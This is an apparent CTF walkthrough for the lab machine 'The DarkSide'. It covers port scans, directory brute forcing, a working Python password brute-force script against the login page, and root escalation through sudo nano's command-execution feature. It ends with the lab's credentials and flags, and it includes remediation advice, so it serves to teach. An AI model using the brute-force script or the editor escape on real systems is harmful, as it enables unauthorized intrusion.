+++
title = "The DarkSide - Walkthrough"
date = "2026-07-01"
author = "nvru"
description = "Walkthrough for The DarkSide machine."
tags = ["ctf", "walkthrough", "linux", "web", "privilege-escalation"]
draft = false
+++

## Target Information

![The DarkSide VM](/images/hmv/darkside/darkside_vm.png)

| Role     | IP Address   |
| -------- | ------------ |
| Attacker | `10.10.10.2` |
| Machine  | `10.10.10.7` |

---

# Port Scanning

## RustScan

```bash
rustscan -a 10.10.10.7 -- -oA nmap/rust
```

### Results

```text
Open 10.10.10.7:22
Open 10.10.10.7:80

[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -oA nmap/rust" on ip 10.10.10.7

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

---

## Nmap

```bash
nmap -sSCV -A -p22,80 -oA nmap/22_80 10.10.10.7
```

### Results

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)

| ssh-hostkey:
|   3072 e0:25:46:8e:b8:bb:ba:69:69:1b:a7:4d:28:34:04:dd (RSA)
|   256 60:12:04:69:5e:c4:a1:42:2d:2b:51:8a:57:fe:a8:8a (ECDSA)
|_  256 84:bb:60:b7:79:5d:09:9c:dd:24:23:a3:f2:65:89:3f (ED25519)

80/tcp open  http    Apache httpd 2.4.56 ((Debian))

| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set

|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: The DarkSide
```

---

# Enumeration

## HTTP (Port 80)

The web application presents a regular login page.

![HTTP Login Page](/images/hmv/darkside/http.png)

### Source Code

Nothing particularly interesting was found in the page source.

![HTTP Source Code](/images/hmv/darkside/src_http.png)

The highlighted (red) text in the page source contains request parameters that may be useful for later brute-force attack

---

## Directory Brute Force

After brute-forcing directories, a hidden directory was discovered.

![Directory Brute Force](/images/hmv/darkside/dir_brute_force.png)

Only a single file existed inside the directory.

![Back Directory](/images/hmv/darkside/backup_dir.png)

![Users Vote](/images/hmv/darkside/users_vote.png)

---

## Login Brute Force

The usernames discovered from the web application were used during brute-forcing.

The following script was used for brute-forcing the login page.

- Login Brute Force Script

```python
#!/usr/bin/env python3

import requests


users = [
    "kevin",
    "rijaba",
    "xerosec",
    "sml",
    "cromiphi",
    "gatogamer",
    "chema",
    "talleyrand",
    "d3b0o",
]


for username in users:
    username = username.strip()
    with open("/opt/wordlists/rockyou-75.txt") as passwords:
        for password in passwords:
            password = password.strip()

            req_data = {"user": username, "pass": password}

            r = requests.post("http://10.10.10.7/", data=req_data)

            if "Username or password invalid" not in r.text:
                print(f"found {username} - {password}")
```

### Credentials Found

```text
Username: kevin
Password: iloveyou
```

![Kevin Web Password](/images/hmv/darkside/kevin_web_pass.png)

---

# Web Access

Successfully logged into the web application as **kevin**.

![Logged In](/images/hmv/darkside/logged_in.png)

A string was discovered that was encoded twice:

1. Base58
2. Base64

![Convert ](/images/hmv/darkside/convert_base.png)

After decoding both layers, nothing immediately useful was revealed.

![Which Side](/images/hmv/darkside/which_side.png)

---

## Source Code

The source code contains an interesting condition.

If the cookie value is:

```text
darkside
```

the application appends the following file to the requested path:

```text
hwvhysntovtanj.password
```

---

# SSH Access

Successfully logged into SSH using the **kevin** account.

![SSH as Kevin](/images/hmv/darkside/ssh_as_kevin.png)

---

# Privilege Escalation

After obtaining access as the **rijaba** user, I enumerated the user's `sudo` permissions using:

```bash
sudo -l
```

The output showed that **rijaba** was permitted to execute **nano** as the **root** user without additional restrictions.

![Switch to rijaba](/images/hmv/darkside/su_rijaba.png)

![Sudo Privileges](/images/hmv/darkside/sudo_rijaba.png)

## Vulnerability

Granting `sudo` access to interactive text editors such as **nano** can be dangerous because they provide features that allow users to execute external commands. When the editor is launched through `sudo`, any spawned command inherits the editor's privileges, making it possible to obtain a shell running as **root**.

## Exploitation

I launched `nano` with elevated privileges:

```bash
sudo nano
```

From within the editor, I accessed the file browser using **Ctrl + T**. The browser allows commands to be executed, which can be abused to spawn a shell. Since `nano` was running as **root**, the spawned shell also inherited **root** privileges.

After executing the command, a root shell was obtained.

![Root Shell](/images/hmv/darkside/root.png)

## Impact

This misconfiguration resulted in complete privilege escalation from the **rijaba** user to **root**, providing unrestricted access to the system. An attacker with this level of access could:

- Read and modify any file on the system.
- Access sensitive credentials and configuration files.
- Create or modify user accounts.
- Install persistence mechanisms.
- Disable security controls or monitoring tools.
- Fully compromise the host.

## Remediation

To prevent this issue:

- Avoid granting `sudo` access to interactive editors such as `nano`, `vim`, or `less`.
- Apply the principle of least privilege when configuring `sudoers`.
- Use purpose-built administrative commands instead of allowing unrestricted editor execution.
- Regularly audit `sudo` permissions for unnecessary or unsafe entries.

---

# Credentials

## Web

```text
kevin : iloveyou
```

## SSH

```text
kevin  : ILoveCalisthenics
rijaba : ILoveJabita
```

---

# Flags

```text
user flag : UnbelievableHumble
root flag : youcametothedarkside
```
